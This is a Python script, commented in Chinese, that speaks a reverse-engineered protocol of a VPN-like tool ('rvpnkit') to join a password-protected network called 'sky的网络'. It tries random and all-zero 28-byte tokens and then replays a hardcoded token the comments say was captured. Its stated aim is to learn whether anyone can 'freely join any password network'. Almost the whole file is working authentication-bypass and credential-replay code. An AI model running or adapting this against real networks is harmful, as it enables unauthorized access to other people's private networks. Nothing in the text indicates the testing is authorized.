"""测试：加入密码网络时，那 28 字节到底是「被校验的口令」还是「随便填的」？

做三组实验（都会先退出再尝试）：
  A. 随机 28 字节
  B. 全 0 的 28 字节
  C. 抓到的真实令牌（对照组，必定成功）

如果 A/B 也能加入，说明密码校验形同虚设 —— 那我们就能自由加入任何密码网络。
"""

import os
import struct
import subprocess
import sys
import time

sys.path.insert(0, r"D:\工作区\workspace1\RvpnKit\native")
import rvpncmd as R  # noqa: E402
from probe_commands import send  # noqa: E402

RVPNKIT = r"C:\rtools\rvpn-target\release\rvpnkit.exe"
DUMP = r"C:\rtools\pw_snap.bin"
TARGET = "sky的网络"
REAL_TOKEN = bytes.fromhex("7c23e3d71caecf7272db703068744d23d1d72faefb7247db46306874")


def decode_str(payload):
    body = payload
    if len(body) >= 2 and body[-2:] == b"\x00\x01":
        body = body[:-2]
    if not body or len(body) % 2:
        return None
    try:
        s = body.decode("utf-16-be")
    except UnicodeDecodeError:
        return None
    return s if s and all(ord(c) >= 0x20 for c in s) else None


def parse(data):
    out, off = [], 0
    while off + 8 <= len(data):
        size = struct.unpack_from(">I", data, off)[0]
        ty, tag, field = data[off + 4], data[off + 6], data[off + 7]
        if size > len(data) - off - 8:
            break
        payload = data[off + 8:off + 8 + size]
        kids = parse(payload) if (ty == 0 and tag == 0x13) else None
        out.append((field, ty, payload, kids))
        off += 8 + size
    return out


def split_frames(stream):
    frames, off = [], 0
    while off + 4 <= len(stream):
        n = struct.unpack_from("<I", stream, off)[0]
        if n == 0 or n > len(stream) - off - 4:
            break
        frames.append(stream[off + 4:off + 4 + n])
        off += 4 + n
    return frames


def networks():
    subprocess.run([RVPNKIT, "--dump", DUMP], capture_output=True, timeout=30)
    raw = open(DUMP, "rb").read()
    frames = split_frames(raw) or [raw]
    out = []

    def walk(recs):
        for field, ty, payload, kids in recs:
            if kids:
                if field == 0x23:
                    name = guid = None
                    for f2, t2, p2, k2 in kids:
                        if k2 is None and f2 == 0x06 and t2 == 3:
                            name = decode_str(p2)
                        elif k2 is None and f2 == 0x09 and t2 == 0x0D:
                            guid = p2
                    if name and guid:
                        out.append((name, guid))
                walk(kids)

    for f in frames:
        walk(parse(f))
    return out


def build_join(name, token):
    inner = R.rec_u32(0, 0x3F) + R.rec_str(name, 0x06)
    inner += struct.pack(">I", len(token)) + bytes([0x08, 0x00, 0x03, 0x0D]) + token
    return (
        R.head(R.new_req_id(), 0x03)
        + struct.pack(">I", len(inner))
        + struct.pack(">I", 0x0000131B)
        + inner
    )


def leave_if_present():
    nets = networks()
    hit = next(((n, g) for n, g in nets if n == TARGET), None)
    if hit:
        send(R.head(R.new_req_id(), 0x05) + R.rec_guid(hit[1], 0x09))
        time.sleep(2.0)
        return True
    return False


def try_join(label, token):
    print(f"\n[{label}] 令牌 = {token.hex()[:32]}…")
    if any(n == TARGET for n, _ in networks()):
        leave_if_present()
    send(build_join(TARGET, token))
    time.sleep(3.0)
    ok = any(n == TARGET for n, _ in networks())
    print(f"   加入{'成功 ✓' if ok else '失败 ✗'}")
    return ok


def main():
    random_tok = os.urandom(28)
    zeros = b"\x00" * 28

    results = {}
    results["随机 28 字节"] = try_join("A 随机", random_tok)
    results["全 0 的 28 字节"] = try_join("B 全零", zeros)
    results["真实令牌"] = try_join("C 真实令牌", REAL_TOKEN)

    print("\n=== 汇总 ===")
    for k, v in results.items():
        print(f"  {k:<18} {'成功' if v else '失败'}")

    if results["随机 28 字节"] or results["全 0 的 28 字节"]:
        print("\n  ★★★ 密码校验没有真正拦人 —— 任意 28 字节即可加入密码网络")
    else:
        print("\n  服务端确实校验令牌，需要正确的 28 字节")

    return 0


if __name__ == "__main__":
    sys.exit(main())
